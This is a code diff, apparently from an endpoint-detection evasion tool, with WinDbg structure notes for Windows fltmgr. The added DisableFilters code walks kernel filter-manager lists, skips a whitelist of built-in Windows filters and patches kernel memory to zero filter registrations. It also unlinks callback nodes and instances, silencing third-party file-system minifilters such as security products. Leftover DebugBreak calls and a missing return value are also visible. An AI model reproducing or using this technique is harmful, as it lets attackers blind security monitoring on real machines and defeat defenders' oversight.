@@ -12,6 +12,7 @@ dt fltmgr!_FLT_FILTER ffff9e81`25cd0020-10
 
 dps ffff9e81`25d8e028-10+68+68 l3
   > _FLT_FILTER.InstanceList.rList => _FLT_INSTANCE.FilterLink
+  (**different from volume which points to _FLT_INSTANCE.Base.PrimaryLink**)
 
 dt fltmgr!_FLT_INSTANCE ffff9e81`25cd0020-70
   > _FLT_FILTER.InstanceList.rList - 70
@@ -43,16 +44,57 @@ dt fltmgr!_FLT_INSTANCE ffff9e81`25cd0020-10
 
 #include "MinifilterCallbacks.h"
 
-TCHAR const* FLTMGR_DRIVER = _T("flgmgr.sys");
-DWORD64 BaseAddr = 0;
+#include "./utils.h"
 
-#define ReadDWORD64(offset) ReadMemoryDWORD64(BaseAddr + ## offset ##)
+TCHAR const* WIN_FILTERS[] = {
+  _T("npsvctrig"),
+  _T("FileInfo"),
+  _T("luafv"),
+  _T("FileCrypt"),
+  _T("storqosflt"),
+  _T("bindflt"),
+  _T("wcifs"),
+  _T("CldFlt"),
+  _T("Wof")
+};
 
-BOOL EnumMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
+TCHAR const* FLTMGR_DRIVER = _T("fltmgr.sys");
+DWORD64 BaseAddr = NULL;
+
+BOOL EnumFilters(const DWORD64 FLTP_FRAME) {
+  DWORD64 FLT_FILTER_head = FLTP_FRAME + g_fltmgrOffsets[FLTOS_FLTP_FRAME__RegisteredFilters] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
+
+  for(
+      DWORD64 FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_head);
+      FLT_FILTER_Base_PrimaryLink != FLT_FILTER_head;
+      FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_Base_PrimaryLink)
+     ) {
+    DWORD64 FLT_FILTER = FLT_FILTER_Base_PrimaryLink - g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink];
+
+    wchar_t driverName[STRING_MAX_LENGTH] = { 0 };
+    ReadUnicodeString(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Name], driverName);
+    if (includesString(WIN_FILTERS, _countof(WIN_FILTERS), driverName)) continue;
+
+    _tprintf_or_not(TEXT("[+] Filter Driver: %s\n"), driverName);
+
+    // Clear registration
+    DWORD64 pRegistration = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Registration];
+    const DWORD64 Registration = ReadMemoryDWORD64(pRegistration);
+    if (Registration == 0) {
+      continue;
+    }
+    return TRUE;
+  }
+
+  return FALSE;
+}
+
+BOOL EnumMinifilterCallbacks() {
   if (!FltmgrOffsetsArePresent()) {
     _putts_or_not(TEXT("FltMgr offsets not loaded ! Aborting..."));
     return FALSE;
   }
+  DebugBreak();
 
   BaseAddr = FindDriverBaseAddress(FLTMGR_DRIVER);
   if (BaseAddr == 0) {
@@ -60,83 +102,97 @@ BOOL EnumMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
     return FALSE;
   }
 
-  BOOL found = FALSE;
-
   _putts_or_not(TEXT("[+] Enumerating Minifilter callbacks"));
-  const DWORD64 pFLTP_FRAME__Links = g_fltmgrOffsets[FLTOS_FltGlobals] + g_fltmgrOffsets[FLTOS_GLOBALS__FrameList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
-  const DWORD64 FLTP_FRAME__Links = ReadDWORD64(pFLTP_FRAME__Links);
-  const DWORD64 FLTP_FRAME = FLTP_FRAME__Links - g_fltmgrOffsets[FLTOS_FLTP_FRAME__Links];
+  const DWORD64 FLTP_FRAME__head = BaseAddr + g_fltmgrOffsets[FLTOS_FltGlobals] + g_fltmgrOffsets[FLTOS_GLOBALS__FrameList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
+  for(
+      DWORD64 FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__head);
+      FLTP_FRAME__Links != FLTP_FRAME__head;
+      FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__Links)
+     ) {
+    const DWORD64 FLTP_FRAME = FLTP_FRAME__Links - g_fltmgrOffsets[FLTOS_FLTP_FRAME__Links];
+    if (EnumFilters(FLTP_FRAME)) {
+      return TRUE;
+    }
+  }
 
+  return FALSE;
+}
+
+
+BOOL DisableFilters(const DWORD64 FLTP_FRAME) {
   DWORD64 FLT_FILTER_head = FLTP_FRAME + g_fltmgrOffsets[FLTOS_FLTP_FRAME__RegisteredFilters] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
 
   for(
-      DWORD64 FLT_FILTER_Base_PrimaryLink = ReadDWORD64(FLT_FILTER_head);
+      DWORD64 FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_head);
       FLT_FILTER_Base_PrimaryLink != FLT_FILTER_head;
-      FLT_FILTER_Base_PrimaryLink = ReadDWORD64(FLT_FILTER_Base_PrimaryLink)
-      ) {
+      FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_Base_PrimaryLink)
+     ) {
     DWORD64 FLT_FILTER = FLT_FILTER_Base_PrimaryLink - g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink];
-    DWORD64 FLT_FILTER__DriverObject = ReadDWORD64(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__DriverObject]);
-    DWORD64 DriverStart = ReadDWORD64(FLT_FILTER__DriverObject + g_fltmgrOffsets[FLTOS_DriverObject__DriverStart]);
-    TCHAR * szDriver = GetDriverName(DriverStart);
-    if (!isDriverNameMatchingEDR(szDriver)) continue;
-    _tprintf_or_not(TEXT("[+] Filter Driver: %p\n"), szDriver);
+
+    wchar_t driverName[STRING_MAX_LENGTH] = { 0 };
+    ReadUnicodeString(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Name], driverName);
+    if (includesString(WIN_FILTERS, _countof(WIN_FILTERS), driverName)) continue;
+
+    _tprintf_or_not(TEXT("[+] Filter Driver: %s\n"), driverName);
+
+    // Clear registration
+    DWORD64 pRegistration = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Registration];
+    const DWORD64 Registration = ReadMemoryDWORD64(pRegistration);
+    if (Registration == 0) {
+      continue;
+    }
+    Patch(pRegistration, 0);
 
     DWORD64 FLT_INSTANCE_head = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
+    DWORD count = ReadMemoryDWORD(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rCount]);
+    if (count == 0) {
+      _tprintf_or_not(TEXT("[+] Clean\n"));
+      continue;
+    }
 
     for(
-        DWORD64 FLT_INSTANCE__FilterLink = ReadDWORD64(FLT_INSTANCE_head);
+        DWORD64 FLT_INSTANCE__FilterLink = ReadMemoryDWORD64(FLT_INSTANCE_head);
         FLT_INSTANCE__FilterLink != FLT_INSTANCE_head;
-        FLT_INSTANCE__FilterLink = ReadDWORD64(FLT_INSTANCE__FilterLink)
-        ) {
+        FLT_INSTANCE__FilterLink = ReadMemoryDWORD64(FLT_INSTANCE__FilterLink)
+       ) {
       DWORD64 FLT_INSTANCE = FLT_INSTANCE__FilterLink - g_fltmgrOffsets[FLTOS_FLT_INSTANCE__FilterLink];
-      DWORD64 CallbackNodes = FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__CallbackNodes];
 
+      // Remove from volume's Callbacks
+      const DWORD64 CallbackNodes = FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__CallbackNodes];
       for (int i = 0; i < 0x32; i++) {
-        DWORD64 CallbackNode = ReadDWORD64(CallbackNodes + sizeof(PVOID) * i);
+        DWORD64 CallbackNode = ReadMemoryDWORD64(CallbackNodes + sizeof(PVOID) * i);
         if (!CallbackNode) continue;
 
-        PVOID list[2][2] = {
-          {(PVOID)g_fltmgrOffsets[FLTOS_CALLBACK_NODE__PreOperation], TEXT("PreOperation")},
-          {(PVOID)g_fltmgrOffsets[FLTOS_CALLBACK_NODE__PostOperation], TEXT("PreOperation")}
-        };
-
-        for (int j = 0; j < sizeof(list); j++) {
-          PVOID* item = list[j];
-          DWORD64 callback = ReadDWORD64((DWORD64)item[0]);
-          if (!callback) continue;
-          _tprintf_or_not(TEXT("[+] [%s] 0x%016llx \n"), (TCHAR *)item[1], callback);
-
-          struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
-          cb->type = MINIFILTER_CALLBACK;
-          cb->driver_name = szDriver;
-          cb->removed = FALSE;
-          cb->callback_func = callback;
-          cb->addresses.minifilter_callback.callback_addr = (DWORD64)item[0];
-          FoundObjectCallbacks->index++;
-          found |= TRUE;
-        }
+        removeDoubleLinkedNode(CallbackNode);
       }
+
+      // Remove from volume's instance list
+      DWORD64 FLT_VOLUME = ReadMemoryDWORD64(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__Volume]);
+      DWORD64 pFLT_VOLUME_InstanceList_count = FLT_VOLUME + g_fltmgrOffsets[FLTOS_FLT_VOLUME__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rCount];
+      DWORD countVol = ReadMemoryDWORD(pFLT_VOLUME_InstanceList_count);
+      PatchExplicit(pFLT_VOLUME_InstanceList_count, (Value){ .dword = countVol - 1 }, (Value){ .dword = countVol }, S4);
+
+      removeDoubleLinkedNode(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink]);
     }
-  }
 
-  return found;
-}
-
-void EnableDisableMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks, BOOL enable) {
-  for (DWORD64 i = 0; i < FoundObjectCallbacks->index; i++) {
-    struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[i];
-    if (cb->type == MINIFILTER_CALLBACK && cb->removed == enable) {
-      _tprintf_or_not(TEXT("[+] [MinifilterCallblacks]\t%s %s callback...\n"), enable ? TEXT("Enabling") : TEXT("Disabling"), cb->driver_name);
-      WriteMemoryDWORD64(cb->addresses.minifilter_callback.callback_addr, enable ? cb->callback_func : 0);
-      cb->removed = !cb->removed;
-    }
+    // Clear instance list from this driver
+    Patch(FLT_INSTANCE_head, FLT_INSTANCE_head);
+    Patch(FLT_INSTANCE_head + 8, FLT_INSTANCE_head);
+    PatchSize(FLT_INSTANCE_head + 16, (Value){ .dword = 0 }, S4);
   }
 }
 
-void DisableMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
-  EnableDisableMinifilterCallbacks(FoundObjectCallbacks, FALSE);
-}
+void DisableMinifilterCallbacks() {
+  _tprintf_or_not(TEXT("[+] [MinifilterCallblacks] Disabling...\n"));
+  DebugBreak();
 
-void EnableMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
-  EnableDisableMinifilterCallbacks(FoundObjectCallbacks, TRUE);
+  const DWORD64 FLTP_FRAME__head = BaseAddr + g_fltmgrOffsets[FLTOS_FltGlobals] + g_fltmgrOffsets[FLTOS_GLOBALS__FrameList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
+  for(
+      DWORD64 FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__head);
+      FLTP_FRAME__Links != FLTP_FRAME__head;
+      FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__Links)
+     ) {
+    const DWORD64 FLTP_FRAME = FLTP_FRAME__Links - g_fltmgrOffsets[FLTOS_FLTP_FRAME__Links];
+    DisableFilters(FLTP_FRAME);
+  }
 }
